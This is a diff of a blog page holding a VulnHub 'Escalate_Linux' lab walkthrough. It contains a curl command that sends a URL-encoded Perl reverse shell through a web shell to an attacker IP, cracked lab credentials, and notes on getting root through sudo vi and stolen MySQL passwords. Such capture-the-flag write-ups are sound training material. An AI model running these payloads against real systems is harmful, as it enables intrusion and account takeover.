@@ -23,11 +23,21 @@
 <meta property="og:site_name" content="rightevil">
 <meta property="og:description" content="Escalate_Linux - A intentionally developed Linux vulnerable virtual machine.The main focus of this machine is to learn Linux Post Exploitation (Privilege Escalation) Techniques.12+ ways of Privilege E">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png">
 <meta property="article:published_time" content="2024-03-15T16:20:59.000Z">
-<meta property="article:modified_time" content="2024-03-15T16:31:16.779Z">
+<meta property="article:modified_time" content="2024-03-17T04:28:59.573Z">
 <meta property="article:author" content="rightevil">
 <meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -362,11 +372,11 @@
 <p>url encode-&gt;final payload(<code>https://www.urlencoder.org/</code>)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.165.60/shell.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.165.130%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22bash%20-i%22%29%3B%7D%3B%27<br></code></pre></td></tr></table></figure>
 
-<h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><h2 id="No-1-user3-shell-PE"><a href="#No-1-user3-shell-PE" class="headerlink" title="No.1 user3/shell PE"></a>No.1 user3/shell PE</h2><p>enum manucal,we find there was a shell binary in /home/user3<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png"></a></p>
-<h2 id="No-2-user5-PE"><a href="#No-2-user5-PE" class="headerlink" title="No.2 user5 PE"></a>No.2 user5 PE</h2><p>in /home/user5, there was a script binary file,after we excute command follow user5’s .bash_history,we could get all the users hash<br>and we could crack root’s passwd <code>root:12345</code><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png"></a><br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png"></a></p>
-<h2 id="No-3-user8-PE"><a href="#No-3-user8-PE" class="headerlink" title="No.3 user8 PE"></a>No.3 user8 PE</h2><p><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png"></a><br>from user8’s history, we find the mysql config file,and find the pass of mysql<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png"></a><br>and we seletc the password of user:mysql<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png"></a><br>and we find the cred of all user<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png"></a></p>
-<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>user2 could use user1’s command,but we dont have user1’s passwd,but we could deduce user1 have the same format passwd <code>user1@12345</code>, and it was after trying.<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png"></a></p>
-<h3 id="user8"><a href="#user8" class="headerlink" title="user8"></a>user8</h3><p>user8 have sudo for vi, so get the root shell by vi(GTFOBins)<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png"></a></p>
+<h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><h2 id="No-1-user3-shell-PE"><a href="#No-1-user3-shell-PE" class="headerlink" title="No.1 user3/shell PE"></a>No.1 user3/shell PE</h2><p>enum manucal,we find there was a shell binary in /home/user3<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f07c5999b7c4f19bbec3c.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="No-2-user5-PE"><a href="#No-2-user5-PE" class="headerlink" title="No.2 user5 PE"></a>No.2 user5 PE</h2><p>in /home/user5, there was a script binary file,after we excute command follow user5’s .bash_history,we could get all the users hash<br>and we could crack root’s passwd <code>root:12345</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/656d3b8bc96a87b6f775c.png" srcset="/img/loading.gif" lazyload><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e0e34d95cf637152c7f3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="No-3-user8-PE"><a href="#No-3-user8-PE" class="headerlink" title="No.3 user8 PE"></a>No.3 user8 PE</h2><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0a9da82e8dc8a8e7b2f97.png" srcset="/img/loading.gif" lazyload><br>from user8’s history, we find the mysql config file,and find the pass of mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/00d61d11d02d289a4152a.png" srcset="/img/loading.gif" lazyload><br>and we seletc the password of user:mysql<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/14a132ed04e3349dc9af6.png" srcset="/img/loading.gif" lazyload><br>and we find the cred of all user<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e293f2154ea3e24f017c3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="user2"><a href="#user2" class="headerlink" title="user2"></a>user2</h3><p>user2 could use user1’s command,but we dont have user1’s passwd,but we could deduce user1 have the same format passwd <code>user1@12345</code>, and it was after trying.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/edd6f037e82469ea6dc5a.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="user8"><a href="#user8" class="headerlink" title="user8"></a>user8</h3><p>user8 have sudo for vi, so get the root shell by vi(GTFOBins)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1a471ad7301b909259593.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p>cause my ability was limited and i was tired in the night,so i just find this way to PE. author say there was 12+ way of PE<br><a target="_blank" rel="noopener" href="https://c5cc8144.telegraph-image-1ba.pages.dev/file/51a2daeb41c21996e999c.png"></a><br><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/escalate_linux-1,323/">escalate:1 download</a><br><a target="_blank" rel="noopener" href="https://0xa1mn.medium.com/escalate-linux-vulnhub-walkthrough-1945a54d3c03">another walkthrough</a></p>
 
                 
@@ -457,6 +467,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/vulnhub-wp-fristileaks-1-3/" title="vulnhub-wp fristileaks:1.3">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub-wp fristileaks:1.3</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
